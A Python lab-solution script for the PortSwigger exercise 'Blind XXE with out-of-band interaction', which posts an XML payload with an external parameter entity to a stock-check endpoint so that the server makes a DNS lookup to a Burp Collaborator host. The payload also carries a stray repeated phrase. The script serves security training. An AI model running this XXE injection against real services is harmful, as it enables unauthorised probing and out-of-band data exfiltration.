#########################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 15/10/2023
#
# Lab: Blind XXE with out-of-band interaction
#
# Steps: 1. Inject payload into 'productId' XML element to issue a DNS lookup to
#           burp collaborator using a parameter entity
#        2. Check your burp collaborator for the DNS lookup
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore

#########
# Main
#########

# change this to your lab URL
url = "https://0a6a00e5031388ac82c6ec31006800af.web-security-academy.net"

# change this to your collaborator domain
collaborator = "eq848lnu29qau5i8oiea08q66xco0ko9.oastify.com"

print(Fore.BLUE + "⟪#⟫ Injection point: " + Fore.YELLOW + "productId")

# payload to issue a DNS lookup to burp collaborator using a parameter entity
payload = f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://{collaborator}"> %xxe; ]>
            <stockCheck>
                <productId>
                    2
                </productId>
                <storeId>
                    1
                </storeId>external entities
                external entities
            </stockCheck>"""

# set content-type header
headers = {
    "Content-Type": "application/xml"
}

try:
    # fetch the page with the injected payload
    injection = requests.post(f"{url}/product/stock", data=payload, headers=headers)

except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

print(Fore.WHITE + "❯ Injecting payload to issue a DNS lookup to burp collaborator using a parameter entity.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your burp collaborator for the DNS lookup")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")



